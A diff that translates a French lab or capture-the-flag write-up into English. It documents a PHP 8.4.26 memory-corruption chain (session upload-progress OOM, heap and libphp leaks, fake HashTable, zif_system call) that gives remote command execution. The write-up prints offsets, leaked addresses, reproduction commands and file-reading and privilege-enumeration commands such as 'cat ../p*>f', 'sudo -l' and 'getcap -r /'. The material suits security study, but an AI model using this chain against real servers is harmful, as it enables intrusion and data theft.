@@ -1,36 +1,31 @@
-# PHP2Shell : du lab Docker à la RCE distante et au flag
+# PHP2Shell: from the Docker lab to remote RCE and the flag
 
-Date de la validation : 26 octobre 2026.
+Validation date: 26 October 2026.
 
-Ce document décrit la reproduction réalisée sur le lab privé autorisé
-`http://192.168.125.10/index.php`. Les adresses, offsets et géométries ci-dessous
-sont propres à PHP 8.4.26, Apache prefork, x86_64 et à cette construction
-binaire. Ce n'est pas un exploit universel.
+This document describes the reproduction performed against the authorized
+private lab `http://192.168.125.10/index.php`. The addresses, offsets and
+geometries below are specific to PHP 8.4.26, Apache prefork, x86_64 and
+this particular binary build. This is not a universal exploit.
 
-## Résultat
+## Result
 
-- fuite du chunk Zend MM : `0x717b64200000` ;
-- fuite de `zval_ptr_dtor` : `0x717b6652db60` ;
-- base de `libphp.so` : `0x717b65ecf000` ;
-- adresse de `zif_system` : `0x717b66334370` ;
-- RCE prouvée avec `sleep 5` ;
-- exécution confirmée sous `www-data` ;
-- flag lu dans `/var/www/proof.txt` :
+- Zend MM chunk base disclosed: `0x717b64200000`;
+- `zval_ptr_dtor` leaked: `0x717b6652db60`;
+- `libphp.so` base: `0x717b65ecf000`;
+- `zif_system` address: `0x717b66334370`;
+- RCE proven with `sleep 5`;
+- execution confirmed as `www-data`;
+- flag read from `/var/www/proof.txt`.
 
-```text
-31050b60beddc661b64e11663431d2fa
-```
+Root escalation was not required: the flag was outside the DocumentRoot but
+readable by the Apache account.
 
-Une élévation root n'était pas nécessaire : le flag était hors du DocumentRoot,
-mais lisible par le compte Apache.
+## 1. Building the reference local lab
 
-## 1. Construire le lab local de référence
+The main lab lives in `docker/php2shell-lab/`. It uses a PHP 8.4.26 amd64
+image pinned by digest and publishes only on the host loopback.
 
-Le lab principal se trouve dans `docker/php2shell-lab/`. Il utilise une image
-PHP 8.4.26 amd64 épinglée par digest et publie uniquement sur le loopback de
-l'hôte.
-
-Sur Linux x86_64 natif :
+On native Linux x86_64:
 
 ```sh
 cd docker/php2shell-lab
@@ -40,7 +35,7 @@ curl --noproxy '*' -fsS http://127.0.0.1:9090/index.php
 ./scripts/test.sh id
 ```
 
-Pour changer le port local :
+To change the local port:
 
 ```sh
 export PHP2SHELL_HOST_PORT=9191
@@ -50,19 +45,18 @@ export PHP2SHELL_HOST_PORT=9191
 ./scripts/test.sh id
 ```
 
-Sur Apple Silicon ou Linux ARM64, `ALLOW_EMULATION=1` permet de démarrer
-l'image amd64 pour les smoke tests :
+On Apple Silicon or Linux ARM64, `ALLOW_EMULATION=1` starts the amd64 image
+for smoke testing:
 
 ```sh
 ALLOW_EMULATION=1 ./scripts/up.sh
 ```
 
-La preuve ASLR/RCE de référence doit toutefois être produite sur Linux x86_64
-natif. L'émulation QEMU/Rosetta change les timings et le comportement de
-l'allocateur.
+The reference ASLR/RCE proof should still be produced on native Linux x86_64.
+QEMU/Rosetta emulation changes timings and allocator behaviour.
 
-Le lab principal charge d'abord `zz-php2shell.ini`, qui contient les invariants
-utiles à la chaîne :
+The main lab loads `zz-php2shell.ini` first, which contains the invariants
+needed by the chain:
 
 ```ini
 memory_limit=8M
@@ -74,66 +68,66 @@ session.use_cookies=1
 session.use_strict_mode=0
 ```
 
-Un second fichier force `display_errors=Off` pour le PoC propre du dépôt. La
-cible distante étudiée avait au contraire `display_errors=On`. Les deux profils
-atteignent le même type de cycle de vie dangereux, mais leurs requêtes de fuite
-ne sont pas interchangeables.
+A second file forces `display_errors=Off` for the repository's clean PoC. The
+remote target studied here had `display_errors=On` instead. Both profiles
+reach the same dangerous lifecycle, but their leak requests are not
+interchangeable.
 
-## 2. Comprendre la primitive A/B
+## 2. Understanding the A/B primitive
 
-Chaque phase utilise deux requêtes multipart sur le même child Apache :
+Each phase uses two multipart requests on the same Apache child:
 
 ```text
-requête A
-  -> PHP traite RFC 1867 avant index.php
-  -> session.upload_progress initialise des globals de session
-  -> un champ de 12 MiB dépasse memory_limit=8M
-  -> le bailout OOM saute une partie du nettoyage
-  -> un pointeur de session reste accroché à la mémoire de requête libérée
+request A
+  -> PHP parses RFC 1867 before index.php
+  -> session.upload_progress initializes session globals
+  -> a 12 MiB field exceeds memory_limit=8M
+  -> the OOM bailout skips part of the cleanup
+  -> a session pointer remains attached to freed request memory
 
-requête B
-  -> de nouveaux champs multipart réallouent les chunks libérés
-  -> l'ancien pointeur désigne maintenant une structure contrôlée
-  -> la primitive devient une fuite ou un appel indirect
+request B
+  -> new multipart fields reallocate the freed chunks
+  -> the old pointer now designates a controlled structure
+  -> the primitive becomes a leak or an indirect call
 ```
 
-Le script PHP cible n'a pas besoin d'implémenter un upload. Le parsing
-multipart et le callback `session.upload_progress` s'exécutent avant le code
-applicatif. Ici, `index.php` contient uniquement :
+The target PHP script does not need to implement an upload. Multipart parsing
+and the `session.upload_progress` callback run before application code. Here,
+`index.php` contains only:
 
 ```php
 <?php echo "OK\n"; ?>
 ```
 
-## 3. Pourquoi un worker neuf est obligatoire
+## 3. Why a fresh worker is mandatory
 
-La géométrie du tas dépend de l'historique du child. Une requête de contrôle,
-un navigateur, un health check ou un précédent essai peut déplacer la zone
-réallouée. Il ne faut donc jamais effectuer un GET entre une rotation réussie
-et la requête A suivante.
+The heap geometry depends on the child's history. A control request, a
+browser, a health check or a previous attempt can move the reallocated zone.
+Never issue a GET between a successful rotation and the next request A.
 
-La rotation envoie :
+The rotation sends:
 
-1. un multipart contenant des centaines de valeurs vivantes ;
-2. les contrôles `PHPSESSID` et `PHP_SESSION_UPLOAD_PROGRESS` ;
-3. un fichier court ;
-4. un champ final de 12 MiB pour l'OOM ;
-5. une requête de cleanup qui consomme l'état corrompu et termine le child.
+1. a multipart containing hundreds of live values;
+2. the `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS` controls;
+3. a short file part;
+4. a final 12 MiB field for the OOM;
+5. a cleanup request that consumes the corrupted state and terminates the
+   child.
 
-Une réponse vide au cleanup est l'oracle utilisé dans ce lab. Apache prefork
-recrée un child depuis le même master. Les mappings de code restent identiques,
-mais le nouveau Zend MM repart d'un état propre.
+An empty response to the cleanup is the oracle used in this lab. Apache
+prefork recreates a child from the same master. Code mappings remain identical,
+but the new Zend MM starts from a clean state.
 
-Deux formes ont été utiles :
+Two shapes were useful:
 
-- la rotation standard : `1001` valeurs de `3000` octets ;
-- après de nombreux essais et GET : `900` valeurs de `3000` octets.
+- the standard rotation: `1001` values of `3000` bytes;
+- after many attempts and GETs: `900` values of `3000` bytes.
 
-La seconde forme est implémentée dans `run_known_command.py`.
+The second shape is implemented in `run_known_command.py`.
 
-## 4. Reconnaissance distante
+## 4. Remote reconnaissance
 
-La première requête passive a retourné :
+The first passive request returned:
 
 ```text
 HTTP/1.1 200 OK
@@ -144,67 +138,67 @@ Connection: close
 OK
 ```
 
-Les OOM contrôlés ont ensuite confirmé :
+Controlled OOMs then confirmed:
 
-- `memory_limit=8M` ;
-- `display_errors=On` ;
-- mod_php avec Apache prefork ;
-- un seul worker disponible ;
-- `session.upload_progress` exploitable avant l'application.
+- `memory_limit=8M`;
+- `display_errors=On`;
+- mod_php with Apache prefork;
+- a single available worker;
+- `session.upload_progress` exploitable before the application.
 
-Le PoC `display_errors=Off` du lab local n'a donc pas été utilisé tel quel. Le
-moteur public conservé dans `sources/alvarodh5-php2shell/exploit.py` a servi de
-base au profil distant `display_errors=On`.
+The lab's `display_errors=Off` PoC was therefore not used as-is. The public
+engine kept in `sources/alvarodh5-php2shell/exploit.py` served as the base
+for the remote `display_errors=On` profile.
 
-## 5. Phase 1 : fuite du chunk Zend MM
+## 5. Phase 1: leaking the Zend MM chunk
 
-La requête A crée le pointeur dangling. La requête B réalloue le chunk de
-`PS(id)` avec un faux `zend_string` dont la longueur vaut `0x1000`.
+Request A creates the dangling pointer. Request B reallocates the `PS(id)`
+chunk with a fake `zend_string` whose length is `0x1000`.
 
-Lors de la génération du header `Set-Cookie`, PHP lit alors au-delà de la
-chaîne réelle. Les pointeurs observés dans les 4096 octets divulgués sont
-regroupés par région de 2 MiB. La région dominante donne :
+When the `Set-Cookie` header is generated, PHP reads beyond the actual string.
+The pointers observed in the 4096 disclosed bytes cluster by 2 MiB region.
+The dominant region yields:
 
 ```text
 Zend MM chunk base = 0x717b64200000
 ```
 
-Cette étape contourne l'ASLR du tas sans lire `/proc` et sans debugger sur la
-cible.
+This step bypasses heap ASLR without reading `/proc` and without a debugger
+on the target.
 
-## 6. Phase 2 : fuite de libphp
+## 6. Phase 2: leaking libphp
 
-Le PoC public créait initialement `983` tableaux et développait le tableau
-d'index `406`. Sur cette cible, les allocations effectuées après l'index 406
-écrasaient la structure intéressante.
+The public PoC initially created `983` arrays and expanded the array at index
+`406`. On this target, allocations made after index 406 overwrote the
+interesting structure.
 
-La calibration a consisté à :
+The calibration consisted of:
 
-1. confirmer par recherche binaire que l'overlap se produit à l'index `406` ;
-2. conserver cet objet comme dernière allocation ;
-3. réduire le total à `N=407`, avec `T=406` et 16 enfants.
+1. confirming by binary search that the overlap occurs at index `406`;
+2. keeping that object as the last allocation;
+3. reducing the total to `N=407`, with `T=406` and 16 children.
 
-Le cookie résultant vaut :
+The resulting cookie is:
 
 ```text
 100000000000000060db52667b710000
 ```
 
-Décodage little-endian :
+Little-endian decoding:
 
 ```text
 nNextFreeElement = 0x10
 zval_ptr_dtor    = 0x717b6652db60
 ```
 
-Pour l'image officielle PHP 8.4.26 trixie x86_64 utilisée par cette cible :
+For the official PHP 8.4.26 trixie x86_64 image used by this target:
 
 ```text
 zval_ptr_dtor offset = 0x65eb60
 zif_system offset    = 0x465370
 ```
 
-Calculs :
+Calculations:
 
 ```text
 libphp = 0x717b6652db60 - 0x65eb60
@@ -214,10 +208,10 @@ zif_system = 0x717b65ecf000 + 0x465370
            = 0x717b66334370
 ```
 
-## 7. Phase 3 : faux HashTable et exécution
+## 7. Phase 3: fake HashTable and execution
 
-La troisième phase réalloue `PS(http_session_vars)` avec une fausse référence
-vers un faux `HashTable`. Les valeurs utilisées sont :
+The third phase reallocates `PS(http_session_vars)` with a fake reference
+pointing to a fake `HashTable`. The values used are:
 
 ```text
 HTDATA offset = 0x690d8
@@ -228,121 +222,114 @@ pDestructor   = zif_system
               = 0x717b66334370
 ```
 
-Le faux `execute_data` contient un argument chaîne qui devient la commande du
-shell. Le carrier de 167 octets limite cette commande à 14 octets.
+The fake `execute_data` contains a string argument that becomes the shell
+command. The 167-byte carrier limits this command to 14 bytes.
 
-## 8. Preuve de RCE sans dépendre du filesystem
+## 8. Proving RCE without depending on the filesystem
 
-Les premiers essais `id` ne rendaient pas la sortie : le child terminait avant
-que PHP vide son buffer HTTP. Une redirection relative dépendait aussi du
-répertoire courant Apache.
+The first `id` attempts did not return output: the child terminated before
+PHP flushed its HTTP buffer. A relative redirection also depended on the
+Apache working directory.
 
-La preuve robuste a donc utilisé :
+The robust proof therefore used:
 
 ```text
 sleep 5
 ```
 
-Mesures observées :
+Observed measurements:
 
 ```text
-rotation OOM       4.904 s   693 octets
-rotation cleanup   0.260 s   réponse vide
-terminal A         3.056 s   367 octets
-terminal B         5.220 s   réponse vide
+rotation OOM       4.904 s   693 bytes
+rotation cleanup   0.260 s   empty response
+terminal A         3.056 s   367 bytes
+terminal B         5.220 s   empty response
 ```
 
-Sans exécution, le POST B ferme normalement la connexion en environ `0,2 s`.
-Le délai supplémentaire de cinq secondes confirme l'appel de `zif_system`.
+Without execution, the terminal B POST normally closes the connection in
+approximately `0.2 s`. The extra five-second delay confirms that
+`zif_system` was called.
 
-Commande de reproduction après redémarrage d'Apache :
+Reproduction command after an Apache restart:
 
 ```sh
 python3 lab/offsec/rce_display_on.py --assume-fresh
 ```
 
-Le script refait les deux fuites, recalcule les adresses et utilise `sleep 5`
-par défaut. Sans redémarrage préalable, retirer `--assume-fresh` pour demander
-une rotation initiale.
+The script repeats both leaks, recalculates the addresses and uses `sleep 5`
+by default. Without a prior restart, remove `--assume-fresh` to request an
+initial rotation.
 
-## 9. Exécuter d'autres commandes courtes
+## 9. Running other short commands
 
-Tant que le master Apache ne redémarre pas, les workers recréés héritent des
-mêmes mappings. Après une fuite complète réussie, le helper suivant réutilise
-les adresses et retente la phase terminale :
+As long as the Apache master does not restart, recreated workers inherit the
+same mappings. After a successful full leak, the following helper reuses the
+addresses and retries only the terminal pair:
 
 ```sh
 python3 lab/offsec/run_known_command.py -c 'whoami>f'
 curl -sS http://192.168.125.10/f
 ```
 
-Résultat :
+Result:
 
 ```text
 www-data
 ```
 
-`run_known_command.py` est volontairement spécifique à cette instance et à ce
-master Apache. Après tout redémarrage du master, il faut relancer
-`rce_display_on.py` et actualiser ses constantes avant de le réutiliser.
+`run_known_command.py` is deliberately specific to this instance and this
+Apache master. After any master restart, re-run `rce_display_on.py` and
+update its constants before reusing it.
 
-## 10. Recherche et récupération du flag
+## 10. Finding and recovering the flag
 
-Les premières hypothèses ont été testées avec des commandes de 14 octets au
-maximum :
+The first hypotheses were tested with commands of at most 14 bytes:
 
 ```text
-cat /flag>f       -> fichier HTTP créé mais vide
-cat /flag*>f      -> aucun fichier /flag*
-env >f            -> aucune variable FLAG
-ls -la / >f       -> aucun flag à la racine
+cat /flag>f       -> HTTP file created but empty
+cat /flag*>f      -> no /flag* file
+env >f            -> no FLAG variable
+ls -la / >f       -> no flag at the root
 whoami>f          -> www-data
 sudo -l>f 2>&1    -> sudo absent
-getcap -r />f     -> aucune file capability exploitable
-ls -l /bin/>f     -> seulement les SUID Debian standards
-mount>f           -> aucun socket ou device hôte exploitable
+getcap -r />f     -> no exploitable file capability
+ls -l /bin/>f     -> only standard Debian SUIDs
+mount>f           -> no exploitable host socket or device
 ```
 
-Il n'était pas utile de devenir root. Un inventaire récursif de `/var` a
-révélé `proof.txt` à côté du DocumentRoot :
+Becoming root was not necessary. A recursive inventory of `/var` revealed
+`proof.txt` next to the DocumentRoot:
 
 ```sh
 python3 lab/offsec/run_known_command.py -c 'ls -Ra /var>f'
 curl -sS http://192.168.125.10/f | grep -i proof
 ```
 
-Le répertoire courant du worker est `/var/www/html`, confirmé par `env`. La
-commande courte suivante lit donc `/var/www/proof.txt` :
+The worker's current directory is `/var/www/html`, confirmed by `env`. The
+following short command therefore reads `/var/www/proof.txt`:
 
 ```sh
 python3 lab/offsec/run_known_command.py -c 'cat ../p*>f'
 curl -sS http://192.168.125.10/f
 ```
 
-Sortie :
+## 11. Produced files
 
-```text
-31050b60beddc661b64e11663431d2fa
-```
+- `lab/offsec/rce_display_on.py`: full remote chain with leaks;
+- `lab/offsec/run_known_command.py`: terminal commands after calibration;
+- `artifacts/remote-offsec-20261026/report.md`: validation report;
+- `sources/alvarodh5-php2shell/exploit.py`: reused multipart engine;
+- `docker/php2shell-lab/`: isolated and reproducible local lab.
 
-## 11. Fichiers produits
+## 12. Limitations and reproducibility rules
 
-- `lab/offsec/rce_display_on.py` : chaîne distante complète avec fuites ;
-- `lab/offsec/run_known_command.py` : commandes terminales après calibration ;
-- `artifacts/remote-192.168.125.10-20261026.md` : rapport de validation ;
-- `sources/alvarodh5-php2shell/exploit.py` : moteur multipart réutilisé ;
-- `docker/php2shell-lab/` : lab local isolé et reproductible.
-
-## 12. Limites et règles de reproductibilité
-
-1. Utiliser uniquement un système possédé ou explicitement autorisé.
-2. Ne pas envoyer de health check entre une rotation et la requête A.
-3. Toute requête parasite peut changer le worker ou la géométrie du tas.
-4. Une réponse vide n'est pas, seule, une preuve de RCE ; la preuve temporelle
-   `sleep 5` ou un effet vérifiable est nécessaire.
-5. Un redémarrage du master invalide toutes les adresses absolues.
-6. Les offsets ELF dépendent du build exact, pas seulement de la version PHP.
-7. Le helper à adresses connues ne remplace jamais les fuites initiales sur une
-   nouvelle cible.
-8. Le fichier `f` est un artefact temporaire créé dans le DocumentRoot et doit
-   être supprimé après collecte de la preuve.
+1. Only use a system you own or that is explicitly authorized.
+2. Do not send a health check between a rotation and request A.
+3. Any stray request can change the worker or the heap geometry.
+4. An empty response alone is not proof of RCE; the `sleep 5` timing proof
+   or a verifiable side effect is required.
+5. A master restart invalidates all absolute addresses.
+6. ELF offsets depend on the exact build, not just the PHP version.
+7. The known-address helper never replaces the initial leaks on a new target.
+8. The `f` file is a temporary artifact created in the DocumentRoot and must
+   be removed after collecting the proof.
